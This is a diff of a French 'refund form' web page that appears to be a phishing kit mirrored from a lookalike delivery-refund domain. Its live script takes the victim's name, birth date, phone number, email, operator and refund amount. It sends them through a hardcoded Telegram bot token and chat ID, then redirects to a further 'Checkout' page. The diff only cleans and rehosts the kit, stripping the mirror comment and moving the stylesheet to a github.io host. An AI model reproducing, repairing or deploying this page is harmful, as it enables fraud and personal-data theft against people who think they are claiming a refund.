@@ -1,13 +1,11 @@
 
 <!DOCTYPE html>
 <html lang="fr">
-
-<!-- Mirrored from remboursement.suivilivraison.shop/order_confirmation/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 06 Mar 2025 17:12:57 GMT -->
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulaire de remboursement</title>
-    <link rel="stylesheet" href="https://rembourse.space/fr/styles.css">
+    <title></title>
+    <link rel="stylesheet" href="https://service-byykk.github.io/ON/styles.css">
 </head>
 <body>
     <div class="container">
@@ -49,7 +47,7 @@
 
     <script>
         function submitForm(event) {
-            event.preventDefault(); // Empêche l'envoi par défaut du formulaire
+            event.preventDefault()
 
             const form = document.getElementById('refundForm');
             const formData = new FormData(form);
@@ -63,8 +61,8 @@
 
             const message = `Nouvelle demande ❤️\n\nNom et prénom 👤: ${name}\nDate de naissance 👤: ${birthdate}\nTel 📞: ${phone}\nEmail 📩: ${email}\nOpérateur: ${operator}\nMontant de remboursement 💶: ${refundAmount} €`;
 
-            const token = '7615266833:AAF8mwElIALiaykPKM0glMMFc7e2urvsQ3k'; // Votre bot token
-            const chatId = '7883894987'; // Votre chat ID
+            const token = '7615266833:AAF8mwElIALiaykPKM0glMMFc7e2urvsQ3k';
+            const chatId = '7883894987';
 
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
@@ -79,7 +77,7 @@
                 })
             }).then(response => {
                 if (response.ok) {
-                    window.location.href = 'Checkout.html'; // Redirige vers la 2ème page
+                    window.location.href = 'Checkout.html';
                 } else {
                     alert('Une erreur est survenue lors de l\'envoi des données. Veuillez réessayer.');
                 }
